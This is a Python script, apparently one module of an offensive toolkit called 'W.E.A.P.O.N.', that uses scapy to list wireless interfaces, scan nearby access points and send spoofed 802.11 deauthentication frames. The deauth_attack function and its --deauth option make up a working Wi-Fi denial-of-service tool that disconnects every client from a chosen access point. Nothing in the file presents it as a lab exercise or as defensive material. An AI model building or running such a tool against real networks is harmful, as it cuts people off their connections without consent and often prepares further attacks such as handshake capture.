import subprocess
import argparse
import sys
from scapy.all import *

def list_interfaces():
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
        print("[*] Available wireless interfaces:\n")
        for line in output.split('\n'):
            if "IEEE 802.11" in line:
                print("  -", line.split()[0])
    except Exception as e:
        print(f"[!] Failed to list interfaces: {e}")

def scan_access_points(interface):
    print(f"[*] Scanning for access points on {interface}...\n")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            bssid = pkt[Dot11].addr2
            channel = int(ord(pkt[Dot11Elt:3].info))
            print(f"[+] {ssid} - {bssid} (CH: {channel})")

    sniff(iface=interface, prn=packet_handler, timeout=15, monitor=True)

def deauth_attack(target_bssid, interface, count=10):
    print(f"[*] Sending {count} deauth packets to {target_bssid} via {interface}...\n")

    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    sendp(packet, iface=interface, count=count, inter=0.2, verbose=1)

def main():
    parser = argparse.ArgumentParser(description="Wireless module for W.E.A.P.O.N.")
    parser.add_argument("--list", action="store_true", help="List wireless interfaces")
    parser.add_argument("--scan", metavar="iface", help="Scan for nearby APs")
    parser.add_argument("--deauth", nargs=2, metavar=("BSSID", "iface"), help="Send deauth packets")

    args = parser.parse_args()

    if args.list:
        list_interfaces()
    elif args.scan:
        scan_access_points(args.scan)
    elif args.deauth:
        bssid, iface = args.deauth
        deauth_attack(bssid, iface)
    else:
        parser.print_help()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This module must be run as root.")
        sys.exit(1)

    main()

